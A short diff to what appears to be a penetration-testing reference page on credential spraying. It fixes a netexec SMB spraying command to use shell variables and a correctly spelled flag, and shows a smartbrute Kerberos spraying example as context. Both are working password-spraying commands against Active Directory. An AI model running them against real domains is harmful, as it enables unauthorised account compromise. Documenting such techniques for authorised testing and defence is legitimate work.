@@ -10,7 +10,7 @@ Credential spraying is a technique that attackers use to try a few passwords (or
 
 ```bash
 # netexec example
-nxc smb target_ip -d domain.local -u users.txt -p "password" --no-bruteforce --continue-on-succes
+nxc smb $TARGET_IP -d $DOMAIN -u users.txt -p $PASSWORD --no-bruteforce --continue-on-success
 
 # smartbrute example (dynamic user list)
 smartbrute smart -bp "password" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$KDC" kerberos
